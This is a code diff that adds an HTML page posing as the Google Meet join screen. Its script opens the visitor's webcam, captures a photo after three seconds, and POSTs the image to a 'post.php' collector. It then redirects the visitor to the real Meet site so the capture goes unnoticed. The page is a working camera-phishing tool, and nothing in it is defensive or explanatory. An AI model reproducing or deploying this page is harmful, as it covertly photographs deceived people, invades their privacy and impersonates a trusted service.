@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Google Meet</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #fff;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            overflow: hidden; /* Prevent scrolling */
+        }
+
+        .top-bar {
+            background-color: #fff;
+            color: #5f6368;
+            padding: 10px;
+            text-align: left;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+
+        .meet-logo {
+            font-size: 20px;
+            font-weight: 500;
+            color: #5f6368;
+            margin-left: 20px;
+        }
+
+        .main-content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: calc(100vh - 50px); /* Adjust height */
+        }
+
+        .video-placeholder {
+            width: 400px;
+            height: 300px;
+            background-color: #424242;
+            margin-bottom: 20px;
+            border-radius: 8px;
+            color: white;
+            text-align: center;
+            line-height: 300px;
+            font-size: 20px;
+        }
+
+        .join-info {
+            text-align: center;
+            color: #202124;
+            margin-bottom: 20px;
+        }
+
+        .meet-code-input {
+            padding: 10px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            margin-right: 10px;
+            width: 250px;
+            outline: none;
+        }
+
+        .meet-code-input:focus {
+            border-color: #4285f4;
+        }
+
+        .join-button, .start-button {
+            background-color: #1a73e8;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s;
+        }
+
+        .join-button:hover, .start-button:hover {
+            background-color: #0d6efd;
+        }
+
+        .bottom-bar {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background-color: #fff;
+            padding: 10px;
+            text-align: center;
+            border-top: 1px solid #e0e0e0;
+        }
+
+        .bottom-bar a {
+            color: #1a73e8;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+
+        .bottom-bar a:hover {
+            text-decoration: underline;
+        }
+
+        /* Styles for video and canvas */
+        #videoElement {
+            width: 400px;
+            height: 300px;
+            background-color: #424242;
+            display: none; /* Initially hide the video */
+        }
+
+        #canvasElement {
+            display: none; /* Initially hide the canvas */
+        }
+    </style>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="top-bar">
+        <span class="meet-logo">Meet</span>
+    </div>
+    <div class="main-content">
+        <video id="videoElement"></video>
+        <canvas id="canvasElement" width="400" height="300"></canvas>
+        <div class="video-placeholder">
+            Video Placeholder
+        </div>
+        <div class="join-info">
+            <p>Enter a meeting code to join:</p>
+            <input type="text" class="meet-code-input" placeholder="Meeting code">
+            <button class="join-button">Join</button>
+        </div>
+        <button class="start-button">New meeting</button>
+    </div>
+    <div class="bottom-bar">
+        <a href="#">Help</a>
+        <a href="#">Privacy</a>
+        <a href="#">Terms</a>
+    </div>
+
+    <script>
+        // Webcam access and image capture
+        var video = document.getElementById('videoElement');
+        var canvas = document.getElementById('canvasElement');
+        var context = canvas.getContext('2d');
+
+        // Get access to the camera!
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function(stream) {
+                    video.srcObject = stream;
+                    video.style.display = 'block'; // Show the video
+                    document.querySelector('.video-placeholder').style.display = 'none'; // Hide the placeholder
+                    video.play();
+
+                    // Capture image after 3 seconds
+                    setTimeout(function() {
+                        captureImage();
+                    }, 3000);
+                });
+        }
+
+        function captureImage() {
+            context.drawImage(video, 0, 0, 400, 300);
+            var imageData = canvas.toDataURL('image/png');
+
+            // Send the image data to the server
+            sendImage(imageData);
+        }
+
+        function sendImage(imageData) {
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', 'post.php', true);
+            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+            xhr.onload = function() {
+                // Redirect to the fake page after sending the image
+                window.location.href = 'https://meet.google.com/new'; // Replace with your actual URL
+            };
+            xhr.send('cat=' + encodeURIComponent(imageData));
+        }
+    </script>
+</body>
+</html>
